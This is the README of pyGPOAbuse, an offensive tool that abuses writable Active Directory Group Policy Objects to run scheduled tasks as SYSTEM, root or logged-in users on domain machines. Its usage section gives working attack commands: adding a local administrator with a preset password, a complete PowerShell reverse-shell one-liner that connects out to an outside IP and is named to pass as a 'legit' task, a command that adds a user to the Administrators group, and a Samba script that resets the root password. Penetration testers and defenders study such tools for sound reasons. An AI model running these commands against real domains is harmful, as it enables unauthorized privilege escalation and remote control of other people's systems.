# pyGPOAbuse

## Description

Python **partial** implementation of [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) by[@pkb1s](https://twitter.com/pkb1s)

This tool can be used when a controlled account can modify an existing GPO that applies to one or more users & computers. It will create an **immediate scheduled task** as **SYSTEM** on the remote computer for computer GPO, or as logged in user for user GPO.

Default behavior adds a local administrator.

![Example](https://github.com/Hackndo/pygpoabuse/raw/master/assets/demo.gif)

## How to use

### Basic usage

Add **john** user to local administrators group (Password: **H4x00r123..**)

```bash
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
``` 

### Advanced usage

Reverse shell example

```bash
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" \ 
    -powershell \ 
    -command "\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" \ 
    -taskname "Completely Legit Task" \
    -description "Dis is legit, pliz no delete" \ 
    -user
``` 

### Item Level Targeting
Scheduled tasks in Group Policy support item level targeting with filters to narrow down execution scopes. Use `-computername` for a NETBIOS computer name. Use `-username` with the required `-usersid` to target a user. Both filters can be combined.

```
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" -computername SERVER01 -command "net localgroup Administrators domain.local\myuser /add"
```

For user and computer targeting together:

```
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" -username 'MORDOR\Administrator' -usersid 'S-1-5-21-1845478662-1755228446-3637421469-500' -computername WIN-M8G28I9SNI7 -command 'whoami'
```

With `-user`, the generated task runs at logon during a 24-hour window starting when the XML is created. It is set to be deleted from the client when that window expires. Computer and `-user-as-admin` tasks remain immediate tasks.

### Cleanup
Delete `ScheduledTasks.xml` from the selected GPO, remove its Scheduled Tasks extension references, and increment the GPO version so clients can detect the change. This deletes every task in that XML file. You can run cleanup again if the XML was already deleted; it will still repair the extension references. It does not directly delete tasks already present on client machines.

```bash
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" --cleanup
```

### Samba AD Usage  

This tool also can be used with Samba AD Domains. It will create an **immediate job** as **root** on the remote computer for computer GPO.  

First, create a Bash script or ELF file.  

```
#!/bin/bash
echo "root:1234" | chpasswd
```

Then execute tool with `--linux-exec` argument.  

```
./pygpoabuse.py DOMAIN/user:password -gpo-id "12345677-ABCD-9876-ABCD-123456789012" --linux-exec /path/to/executable
```

![Example](https://github.com/user-attachments/assets/173baf0b-e502-4424-bdf6-f97ed0e042af)

## Credits

* [@pkb1s](https://twitter.com/pkb1s) for [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
* [@airman604](https://twitter.com/airman604) for [schtask_now.py](https://github.com/airman604/schtask_now)
* [@SkelSec](https://twitter.com/skelsec) for [msldap](https://github.com/skelsec/msldap)

